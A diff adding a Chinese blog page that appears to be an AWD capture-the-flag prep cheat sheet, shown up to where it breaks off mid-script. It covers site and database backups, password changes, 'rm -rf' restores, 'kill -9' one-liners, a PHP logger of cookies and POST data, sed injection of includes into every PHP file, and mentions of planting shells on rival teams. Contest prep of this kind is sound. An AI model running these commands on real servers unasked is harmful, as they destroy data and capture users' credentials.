@@ -1,0 +1,599 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Doraemoo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AWD 经过整理，需要的一些工具和脚本和自己的字典（方便到时候直接复制粘贴，提高效率）  1. 工具  D盾 WireShark burpsuite（搭配其中的工具Reissue Request Scripter，可以根据你抓到的请求包直接生成请求脚本） nmap或者httpscan 服务器管理软件，比如XFTP   2. 脚本  流量监控waf 加密shell（MD5，RSA等等，都可）   3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD">
+<meta property="og:url" content="https://doraemoo.github.io/2022/03/03/AWD/index.html">
+<meta property="og:site_name" content="Doraemoo">
+<meta property="og:description" content="AWD 经过整理，需要的一些工具和脚本和自己的字典（方便到时候直接复制粘贴，提高效率）  1. 工具  D盾 WireShark burpsuite（搭配其中的工具Reissue Request Scripter，可以根据你抓到的请求包直接生成请求脚本） nmap或者httpscan 服务器管理软件，比如XFTP   2. 脚本  流量监控waf 加密shell（MD5，RSA等等，都可）   3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/03/30/e1KgfhJclHopNB7.png">
+<meta property="article:published_time" content="2022-03-03T06:47:18.000Z">
+<meta property="article:modified_time" content="2022-03-03T06:50:30.238Z">
+<meta property="article:author" content="Doraemoo">
+<meta property="article:tag" content="AWD">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/30/e1KgfhJclHopNB7.png">
+  
+  
+  <title>AWD - Doraemoo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"doraemoo.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":17691437,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Doraemoo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://w.wallhaven.cc/full/wq/wallhaven-wqv5xx.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="AWD">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-03 14:47" pubdate>
+        2022年3月3日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      10k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      88 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">AWD</h1>
+            
+            <div class="markdown-body">
+              <h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><blockquote>
+<p>经过整理，需要的一些工具和脚本和自己的字典（方便到时候直接复制粘贴，提高效率）</p>
+</blockquote>
+<h3 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h3><blockquote>
+<ul>
+<li>D盾</li>
+<li>WireShark</li>
+<li>burpsuite（搭配其中的工具Reissue Request Scripter，可以根据你抓到的请求包直接生成请求脚本）</li>
+<li>nmap或者<a target="_blank" rel="noopener" href="https://github.com/zer0h/httpscan">httpscan</a></li>
+<li>服务器管理软件，比如XFTP</li>
+</ul>
+</blockquote>
+<h3 id="2-脚本"><a href="#2-脚本" class="headerlink" title="2. 脚本"></a>2. 脚本</h3><blockquote>
+<ul>
+<li>流量监控waf</li>
+<li>加密shell（MD5，RSA等等，都可）</li>
+</ul>
+</blockquote>
+<h3 id="3-备份"><a href="#3-备份" class="headerlink" title="3.备份"></a>3.备份</h3><h4 id="站点源码备份"><a href="#站点源码备份" class="headerlink" title="站点源码备份"></a>站点源码备份</h4><blockquote>
+<p>源码备份可以用前面所说的工具<code>Winscp</code>或者<code>FileZilla</code>，但是每个主办方服务器不同，你要把他拉到本机可能会速度比较慢。</p>
+<p>速度快的方法就是直接用<code>tar</code>打包，放在自己的<code>home</code>目录下（这里队友@CjM00n提到一点，最好不要放在<code>tmp</code>目录下，因为这个目录没有权限配置，同理我们要是拿到了shell，可以到别人<code>tmp</code>目录下康康，说不定能找到一些好康的），然后再把他传到本机来</p>
+</blockquote>
+<p><code>tar</code>备份方法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">cd /var/www/html<br>tar -zcvf ~/html.tar.gz *<br></code></pre></td></tr></table></figure>
+
+<p>还原的话方法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -rf /var/www/html<br>tar -zxvf ~/html.tar.gz -C /var/www/html<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /var/www/html<br>rm -rf *<br>tar -zxvf ~/html.tar.gz<br></code></pre></td></tr></table></figure>
+
+<h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><blockquote>
+<p>有时候数据库里也有flag，所以要将数据库也备份一下，避免删库跑路</p>
+<p>首先是找配置文件，翻一翻账号密码</p>
+</blockquote>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/var/</span>www/html<br><span class="hljs-keyword">find</span> .|xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>备份：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /var/lib/mysql <span class="hljs-comment">#(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p Test &gt; Test.sql <span class="hljs-comment"># 输入密码即可。</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p --all-databases &gt; ~/backup.sql  <span class="hljs-comment"># 备份所有数据库</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysqldump -u root -p --all-databases -skip-lock-tables &gt; ~/backup.sql  <span class="hljs-comment"># 跳过锁定的数据库表</span></span><br></code></pre></td></tr></table></figure>
+
+<p>还原：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash">mysql -u root -p</span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash">create database [database_name];  <span class="hljs-comment"># 输入要还原的数据库名</span></span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash">use [database_name]</span><br><span class="hljs-meta">mysql&gt; </span><span class="language-bash"><span class="hljs-built_in">source</span> backup.sql;    <span class="hljs-comment"># source后跟备份的文件名Copy</span></span><br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /var/lib/mysql <span class="hljs-comment"># (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span></span><br><span class="hljs-meta">$ </span><span class="language-bash">mysql -u root -p Test &lt; Test.sql  <span class="hljs-comment"># 输入密码即可（将要恢复的数据库文件放到服务器的某个目</span></span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-口令修改"><a href="#4-口令修改" class="headerlink" title="4. 口令修改"></a>4. 口令修改</h3><blockquote>
+<p>需要修改的口令包括：ssh弱口令、CMS后台弱口令、数据库root口令</p>
+</blockquote>
+<h4 id="数据库口令修改"><a href="#数据库口令修改" class="headerlink" title="数据库口令修改"></a>数据库口令修改</h4><blockquote>
+<p>一般来说，数据库的密码是一定要修改的</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$ mysql -u root -p<br>show databases;<br>use mysql<br>set password for root@localhost = password(&#x27;123&#x27;);<br>或者<br>update user set password = PASSWORD(&#x27;需要更换的密码&#x27;) where user=&#x27;root&#x27;;<br>update user set password = PASSWORD(&#x27;1&#x27;) where user=&#x27;root&#x27;;<br>flush privileges;<br>show tables;   # 看看有没有flag<br></code></pre></td></tr></table></figure>
+
+<h4 id="修改SSH口令"><a href="#修改SSH口令" class="headerlink" title="修改SSH口令"></a>修改SSH口令</h4><p>首先登陆SSH，然后：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">passwd [user]<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>限制ssh登陆，进行访问控制<br>禁止从xx.xx.xx.xx远程登陆到本机iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp –dport 22 -j DROP#允许xx.xx.xx.xx网段远程登陆访问sshiptables -A INPUT -s xx.xx.xx.1&#x2F;24 -p tcp –dport 22 -j ACCEPT</p>
+</blockquote>
+<h4 id="关闭指定端口"><a href="#关闭指定端口" class="headerlink" title="关闭指定端口"></a>关闭指定端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 $(netstat -nlp | grep :8080 | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h4 id="关闭除指定端口以外的所有端口"><a href="#关闭除指定端口以外的所有端口" class="headerlink" title="关闭除指定端口以外的所有端口"></a>关闭除指定端口以外的所有端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 $(netstat -anopt | grep -v &quot;sshd\|httpd\|mysqld&quot; | awk &#x27;&#123;print $7&#125;&#x27; | awk -F&quot;/&quot; &#x27;&#123; print $1 &#125;&#x27;)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-上WAF"><a href="#5-上WAF" class="headerlink" title="5.上WAF"></a>5.上WAF</h3><h4 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h4><blockquote>
+<p>改完密码之后第一件事，就是上流量监控的脚本。</p>
+<p>这个真的很重要很重要！因为当你自己找不到漏洞的时候，一个好的流量监控脚本可以帮助你找到漏洞（抄作业</p>
+<p>然后你可以通过这些流量把洞补了，再拿它来打别人，如果遇到垃圾流量又是另一回事了。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];      <span class="hljs-comment">//记录访问者的ip</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];       <span class="hljs-comment">//访问者要访问的文件名</span><br><span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>];      <span class="hljs-comment">//访问者要请求的参数</span><br><span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];       <span class="hljs-comment">//请求方法</span><br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];             <span class="hljs-comment">//请求URI</span><br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>());     <span class="hljs-comment">//访问时间</span><br><span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);       <span class="hljs-comment">//接收POST数据</span><br><span class="hljs-variable">$others</span> = <span class="hljs-string">&#x27;...其他你想得到的信息...&#x27;</span>;<br><span class="hljs-variable">$logadd</span> = <span class="hljs-string">&#x27;Visit Time：&#x27;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-string">&#x27;Visit IP：&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;RequestURI：&#x27;</span>.<span class="hljs-variable">$uri</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">&#x27;RequestMethod：&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-comment">// log记录</span><br><span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/tmp/log.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_COOKIE</span>, <span class="hljs-literal">true</span>).<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$others</span>.<span class="hljs-string">&quot;\r\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种脚本一般放置在CMS的入口文件处，下面列出几个常见CMS的入口地址，在这些入口的文件里使用<code>require_once()</code>就可以将监控脚本包含进去，达到流量监控的目的：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPCMS V9 \phpcms\base.php<br>PHPWIND8.<span class="hljs-number">7</span> \data\sql_config.php<br>DEDECMS5.<span class="hljs-number">7</span> \data\common.inc.php<br>DiscuzX2   \config\config_global.php<br>Wordpress   \wp-config.php<br>Metinfo   \<span class="hljs-keyword">include</span>\head.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo find /var/www/html/ -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php /&lt;?php\nrequire_once(&#x27;\/var\/www\/html\/waf2.php&#x27;);\n/g&quot;<br><span class="hljs-meta">#</span><span class="language-bash">意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><blockquote>
+<p>文件监控也是一个比较imba的脚本了，就是将任何没有免死金牌的上传文件全部拦截，上传一个我就自动给你删掉，或者将其中的文件内容直接全部修改掉，这种脚本说实话也是比较危险，看实际情况判断一下吧，下面就是一个文件监控脚本：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#use: python file_check.py ./</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> ntpath<br><span class="hljs-keyword">import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125;      <span class="hljs-comment"># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class="hljs-comment"># 特殊文件路径字符串</span><br>Special_path_str = <span class="hljs-string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class="hljs-string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class="hljs-string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class="hljs-string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class="hljs-string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class="hljs-string">&#x27;diaossama&#x27;</span>  <span class="hljs-comment"># 免死金牌</span><br>UNICODE_ENCODING = <span class="hljs-string">&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r&quot;\?%02x&quot;</span><br><br><span class="hljs-comment"># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class="hljs-string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class="hljs-string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class="hljs-string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class="hljs-string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isListLike</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">isinstance</span>(value, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">set</span>))<br><br><span class="hljs-comment"># 获取Unicode编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUnicode</span>(<span class="hljs-params">value, encoding=<span class="hljs-literal">None</span>, noneToNull=<span class="hljs-literal">False</span></span>):<br><br>    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><br>    <span class="hljs-keyword">if</span> isListLike(value):<br>        value = <span class="hljs-built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)<br>        <span class="hljs-keyword">return</span> value<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, unicode):<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)<br>                <span class="hljs-keyword">except</span>:<br>                    value = value[:ex.start] + <span 